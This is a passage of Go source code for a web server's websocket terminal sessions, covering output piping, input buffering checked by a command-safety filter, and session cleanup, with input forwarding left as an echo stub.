	ws.terminalMutex.Unlock()
	
	// Handle stdout and stderr
	go func() {
		io.Copy(session.Conn, stdout)
	}()
	
	go func() {
		io.Copy(session.Conn, stderr)
	}()
	
	return session, nil
}

func (ws *WebServer) handleTerminalOutput(session *TerminalSession) {
	// This would handle PTY output in a full implementation
	// For now, it's handled in createTerminalSession
}

func (ws *WebServer) handleTerminalInput(session *TerminalSession) {
	defer session.Conn.Close()
	
	var commandBuffer strings.Builder
	
	for {
		_, message, err := session.Conn.ReadMessage()
		if err != nil {
			log.Debug("terminal websocket read error: %v", err)
			break
		}
		
		session.mutex.Lock()
		session.LastActivity = time.Now()
		session.mutex.Unlock()
		
		// Process input character by character
		for _, char := range string(message) {
			switch char {
			case '\r', '\n':
				// Command entered, check if safe
				command := commandBuffer.String()
				if command != "" && !ws.commandFilter.IsCommandSafe(command) {
					// Block dangerous command
					warningMsg := fmt.Sprintf("\r\n❌ Command blocked for security: %s\r\n", command)
					session.Conn.WriteMessage(1, []byte(warningMsg))
					commandBuffer.Reset()
					continue
				}
				commandBuffer.Reset()
			case '\b', 127: // Backspace
				if commandBuffer.Len() > 0 {
					str := commandBuffer.String()
					commandBuffer.Reset()
					commandBuffer.WriteString(str[:len(str)-1])
				}
			default:
				commandBuffer.WriteRune(char)
			}
		}
		
		// Forward input to terminal (in a full implementation)
		// For now, we'll just echo back
		session.Conn.WriteMessage(1, message)
	}
}

func (ws *WebServer) cleanupTerminalSession(sessionID string) {
	ws.terminalMutex.Lock()
	defer ws.terminalMutex.Unlock()
	
	session, exists := ws.terminalSessions[sessionID]
	if !exists {
		return
	}
	
	session.IsActive = false
	
	if session.CMD != nil && session.CMD.Process != nil {
		session.CMD.Process.Kill()
	}
	
	if session.Conn != nil {
		session.Conn.Close()
	}
	
	delete(ws.terminalSessions, sessionID)
	log.Info("terminal session cleaned up: %s", sessionID)
}